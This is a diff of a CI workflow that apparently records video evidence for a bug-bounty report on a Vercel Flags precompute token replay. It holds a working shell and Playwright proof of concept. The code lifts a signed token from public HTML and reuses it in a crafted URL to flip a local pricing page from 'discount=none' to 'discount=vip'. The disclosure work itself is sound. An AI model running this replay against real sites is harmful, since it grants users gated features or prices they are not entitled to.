@@ -1,4 +1,4 @@
-name: Vercel Flags visual replay evidence
+name: Vercel Flags real desktop proof
 
 on:
   push:
@@ -7,8 +7,8 @@ on:
   workflow_dispatch:
 
 jobs:
-  visual-evidence:
-    runs-on: ubuntu-latest
+  real-desktop-proof:
+    runs-on: ubuntu-22.04
     env:
       FLAGS_SECRET: Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M
       NEXT_TELEMETRY_DISABLED: 1
@@ -20,8 +20,10 @@ jobs:
         with:
           node-version: '22'
 
-      - name: Install app and browser
+      - name: Install app, Chromium, and real desktop capture tools
         run: |
+          sudo apt-get update
+          sudo apt-get install -y xvfb xterm fluxbox ffmpeg xdotool
           cd security/vercel-flags-precompute-replay/e2e
           npm install --no-audit --no-fund
           npm install --no-save playwright@1.55.0
@@ -45,158 +47,176 @@ jobs:
             fi
             sleep 1
           done
-          cat /tmp/next.log || true
           test "$ready" -eq 1
-          echo "EVIDENCE production_server_ready=true"
+          echo "production_server_ready=true"
 
-      - name: Capture real exploit responses in Chromium
+      - name: Record real terminal and headed Chromium
         run: |
           cd security/vercel-flags-precompute-replay/e2e
-          mkdir -p evidence/video
-          cat > visual-evidence.mjs <<'NODE'
+          rm -rf evidence-real
+          mkdir -p evidence-real
+          rm -f /tmp/h1-phase-* /tmp/h1-browser-* /tmp/h1-proof-done
+
+          cat > proof-terminal.sh <<'BASH'
+          #!/usr/bin/env bash
+          set -euo pipefail
+
+          ORIGIN="http://127.0.0.1:3000"
+
+          clear
+          printf 'VERCEL FLAGS HACKERONE PROOF — REAL COMMAND EXECUTION\n'
+          printf '==================================================\n\n'
+          printf '$ node --version\n'
+          node --version
+          printf '$ npm ls flags next --depth=0\n'
+          npm ls flags next --depth=0 || true
+          printf '\n'
+
+          printf '$ curl -fsS %s/\n' "$ORIGIN"
+          ROOT_HTML="$(curl -fsS "$ORIGIN/")"
+          ROOT_RENDERED="$(printf '%s' "$ROOT_HTML" | sed 's/<!-- -->//g' | grep -o 'navigation=[^<]*' | head -1)"
+          printf 'rendered_result=%s\n' "$ROOT_RENDERED"
+
+          TOKEN="$(printf '%s' "$ROOT_HTML" | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+' | head -1)"
+          test -n "$TOKEN"
+          TOKEN_SHA="$(printf '%s' "$TOKEN" | sha256sum | awk '{print $1}')"
+          printf 'source_token_sha256=%s\n' "$TOKEN_SHA"
+          printf 'source_token=%s\n' "$TOKEN"
+          printf '%s' "$TOKEN" > /tmp/h1-source-token
+          printf '%s' "$TOKEN_SHA" > /tmp/h1-source-sha
+          touch /tmp/h1-phase-1
+          while [ ! -e /tmp/h1-browser-1 ]; do sleep 0.1; done
+
+          printf '\n$ curl -fsS %s/pricing\n' "$ORIGIN"
+          BASE_HTML="$(curl -fsS "$ORIGIN/pricing")"
+          BASE_RENDERED="$(printf '%s' "$BASE_HTML" | sed 's/<!-- -->//g' | grep -o 'navigation=[^<]*;discount=[^<]*' | head -1)"
+          printf 'baseline_result=%s\n' "$BASE_RENDERED"
+          printf '%s' "$BASE_RENDERED" | grep -q 'discount=none'
+          touch /tmp/h1-phase-2
+          while [ ! -e /tmp/h1-browser-2 ]; do sleep 0.1; done
+
+          REPLAY_URL="$ORIGIN/$TOKEN/pricing/$TOKEN"
+          printf '\nREPLAY: exact same signed token is used in both URL positions\n'
+          printf 'source_token_sha256=%s\n' "$TOKEN_SHA"
+          printf 'token_modified=false\n'
+          printf '$ curl -fsS "%s"\n' "$REPLAY_URL"
+          REPLAY_HTML="$(curl -fsS "$REPLAY_URL")"
+          REPLAY_RENDERED="$(printf '%s' "$REPLAY_HTML" | sed 's/<!-- -->//g' | grep -o 'navigation=[^<]*;discount=[^<]*' | head -1)"
+          printf 'replay_result=%s\n' "$REPLAY_RENDERED"
+          printf '%s' "$REPLAY_RENDERED" | grep -q 'discount=vip'
+          printf 'same_token_used_for_root_and_pricing=true\n'
+          printf 'cross_group_replay=PASS\n'
+          printf '%s' "$REPLAY_URL" > /tmp/h1-replay-url
+          touch /tmp/h1-phase-3
+          while [ ! -e /tmp/h1-browser-3 ]; do sleep 0.1; done
+
+          printf '\nPROOF COMPLETE — browser at right shows the same live responses.\n'
+          printf 'No generated or composited evidence was used.\n'
+          sleep 5
+          touch /tmp/h1-proof-done
+          BASH
+          chmod +x proof-terminal.sh
+
+          cat > proof-browser.mjs <<'NODE'
           import { chromium } from 'playwright';
           import fs from 'node:fs';
-          import crypto from 'node:crypto';
 
           const origin = 'http://127.0.0.1:3000';
 
-          async function get(path) {
-            const res = await fetch(origin + path);
-            const body = await res.text();
-            if (!res.ok) throw new Error('HTTP ' + res.status + ' for ' + path);
-            return body;
+          async function waitFile(path) {
+            while (!fs.existsSync(path)) {
+              await new Promise(r => setTimeout(r, 100));
+            }
           }
 
-          const rootHtml = await get('/');
-          const tokenMatch = rootHtml.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+/);
-          if (!tokenMatch) throw new Error('Could not extract signed source token from public HTML');
-          const token = tokenMatch[0];
-
-          function renderedText(html) {
-            return html
-              .replace(/<!--.*?-->/g, '')
-              .replace(/<[^>]+>/g, ' ')
-              .replace(/\s+/g, ' ')
-              .trim();
-          }
-
-          const baselinePath = '/pricing';
-          const baselineHtml = await get(baselinePath);
-          if (!renderedText(baselineHtml).includes('discount=none')) {
-            throw new Error('Normal pricing flow did not render discount=none');
-          }
-
-          const replayPath = '/' + token + '/pricing/' + token;
-          const replayHtml = await get(replayPath);
-          if (!renderedText(replayHtml).includes('discount=vip')) {
-            throw new Error('Replay production response did not render discount=vip');
-          }
-
-          const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
-
-          const browser = await chromium.launch({ headless: true });
-          const context = await browser.newContext({
-            viewport: { width: 1280, height: 720 },
-            recordVideo: { dir: 'evidence/video', size: { width: 1280, height: 720 } },
+          const browser = await chromium.launch({
+            headless: false,
+            args: [
+              '--window-position=810,0',
+              '--window-size=790,900',
+              '--no-sandbox',
+              '--disable-dev-shm-usage',
+            ],
           });
+          const context = await browser.newContext({ viewport: null });
           const page = await context.newPage();
 
-          async function annotate(title, lines) {
-            await page.evaluate(({ title, lines }) => {
-              const old = document.getElementById('__h1_evidence');
-              if (old) old.remove();
-              const box = document.createElement('div');
-              box.id = '__h1_evidence';
-              Object.assign(box.style, {
-                position: 'fixed',
-                top: '16px',
-                left: '16px',
-                right: '16px',
-                zIndex: '2147483647',
-                background: 'rgba(0,0,0,.92)',
-                color: '#fff',
-                padding: '16px 20px',
-                borderRadius: '12px',
-                fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
-                fontSize: '18px',
-                lineHeight: '1.45',
-                whiteSpace: 'pre-wrap',
-              });
-              const h = document.createElement('div');
-              h.textContent = title;
-              h.style.fontWeight = '700';
-              h.style.fontSize = '22px';
-              h.style.marginBottom = '8px';
-              box.appendChild(h);
-              const body = document.createElement('div');
-              body.textContent = lines.join('\n');
-              box.appendChild(body);
-              document.body.appendChild(box);
-            }, { title, lines });
-          }
-
+          await waitFile('/tmp/h1-phase-1');
           await page.goto(origin + '/', { waitUntil: 'networkidle' });
-          await annotate('STEP 1 / 3 — capture legitimate source token', [
-            'Live page: ' + page.url(),
-            'Observed application result: navigation=new',
-            'Extracted signed source token SHA-256: ' + tokenHash,
-            'No token modification or re-signing performed',
-          ]);
-          await page.waitForTimeout(3000);
+          await page.waitForTimeout(2200);
+          fs.writeFileSync('/tmp/h1-browser-1', 'ok');
 
-          await page.goto(origin + baselinePath, { waitUntil: 'networkidle' });
-          await annotate('STEP 2 / 3 — normal pricing flow', [
-            'Live page: ' + page.url(),
-            'Observed application result: discount=none',
-            'This is the expected target-group result before replay',
-          ]);
-          await page.screenshot({ path: 'evidence/01-baseline-real-production-response.png', fullPage: true });
-          await page.waitForTimeout(3000);
+          await waitFile('/tmp/h1-phase-2');
+          await page.goto(origin + '/pricing', { waitUntil: 'networkidle' });
+          await page.waitForTimeout(2600);
+          fs.writeFileSync('/tmp/h1-browser-2', 'ok');
 
-          await page.goto(origin + replayPath, { waitUntil: 'networkidle' });
-          await annotate('STEP 3 / 3 — exploit performed', [
-            'Live page contains the source token in BOTH source and pricing positions',
-            'Observed application result: discount=vip',
-            'Source token SHA-256: ' + tokenHash,
-            'Same source token reused in pricing position: true',
-            'Token modified: false',
-            'RESULT: cross-group replay changed the pricing decision',
-          ]);
-          await page.screenshot({ path: 'evidence/02-replay-real-production-response.png', fullPage: true });
+          await waitFile('/tmp/h1-phase-3');
+          const replayURL = fs.readFileSync('/tmp/h1-replay-url', 'utf8');
+          await page.goto(replayURL, { waitUntil: 'networkidle' });
           await page.waitForTimeout(5000);
+          fs.writeFileSync('/tmp/h1-browser-3', 'ok');
 
-          fs.writeFileSync('evidence/evidence.txt', [
-            'SOURCE=real Next.js production server responses',
-            'flags=4.3.1',
-            'next=16.3.6',
-            'node=' + process.version,
-            'baseline_request=' + baselinePath,
-            'baseline_result=discount=none',
-            'replay_request=' + replayPath,
-            'replay_result=discount=vip',
-            'source_token_sha256=' + tokenHash,
-            'same_token_used_for_root_and_pricing=true',
-            'token_modified=false',
-            'cross_group_replay=PASS',
-          ].join('\n') + '\n');
-
-          console.log('EVIDENCE baseline=discount=none');
-          console.log('EVIDENCE replay=discount=vip');
-          console.log('EVIDENCE same_token_used_for_root_and_pricing=true');
-          console.log('EVIDENCE token_modified=false');
-          console.log('EVIDENCE cross_group_replay=PASS');
-
-          await context.close();
+          await waitFile('/tmp/h1-proof-done');
+          await page.screenshot({
+            path: 'evidence-real/final-live-browser.png',
+            fullPage: true,
+          });
           await browser.close();
           NODE
-          node visual-evidence.mjs
 
-      - name: Upload visual evidence
+          export DISPLAY=:99
+          Xvfb :99 -screen 0 1600x900x24 > /tmp/xvfb.log 2>&1 &
+          XVFB_PID=$!
+          sleep 1
+          fluxbox > /tmp/fluxbox.log 2>&1 &
+          FLUXBOX_PID=$!
+          sleep 2
+
+          ffmpeg -y -loglevel warning \
+            -f x11grab -framerate 30 -video_size 1600x900 -i :99.0 \
+            -c:v libx264 -preset veryfast -crf 20 -pix_fmt yuv420p \
+            evidence-real/vercel-flags-real-terminal-browser-proof.mp4 \
+            > /tmp/ffmpeg.log 2>&1 &
+          FFMPEG_PID=$!
+
+          xterm \
+            -geometry 92x47+0+0 \
+            -fa Monospace -fs 11 \
+            -bg black -fg white \
+            -title "REAL TERMINAL — Vercel Flags PoC" \
+            -hold -e bash ./proof-terminal.sh &
+          XTERM_PID=$!
+
+          node proof-browser.mjs
+
+          kill -INT "$FFMPEG_PID" || true
+          wait "$FFMPEG_PID" || true
+          kill "$XTERM_PID" || true
+          kill "$FLUXBOX_PID" || true
+          kill "$XVFB_PID" || true
+
+          test -s evidence-real/vercel-flags-real-terminal-browser-proof.mp4
+          ffprobe -v error \
+            -show_entries format=duration,size \
+            -of default=noprint_wrappers=1 \
+            evidence-real/vercel-flags-real-terminal-browser-proof.mp4
+
+          printf 'SOURCE=continuous X11 desktop recording\n' > evidence-real/manifest.txt
+          printf 'terminal=xterm executing real curl/hash commands\n' >> evidence-real/manifest.txt
+          printf 'browser=headed Chromium driven against local production Next.js server\n' >> evidence-real/manifest.txt
+          printf 'video=ffmpeg x11grab of DISPLAY :99\n' >> evidence-real/manifest.txt
+          printf 'editing=none\n' >> evidence-real/manifest.txt
+          printf 'synthetic_frames=none\n' >> evidence-real/manifest.txt
+          printf 'generated_evidence=none\n' >> evidence-real/manifest.txt
+          printf 'cross_group_replay=PASS\n' >> evidence-real/manifest.txt
+
+      - name: Upload real desktop evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: vercel-flags-visual-evidence
+          name: vercel-flags-real-terminal-browser-proof
           path: |
-            security/vercel-flags-precompute-replay/e2e/evidence/**
-          if-no-files-found: warn
+            security/vercel-flags-precompute-replay/e2e/evidence-real/**
+          if-no-files-found: error
           retention-days: 7
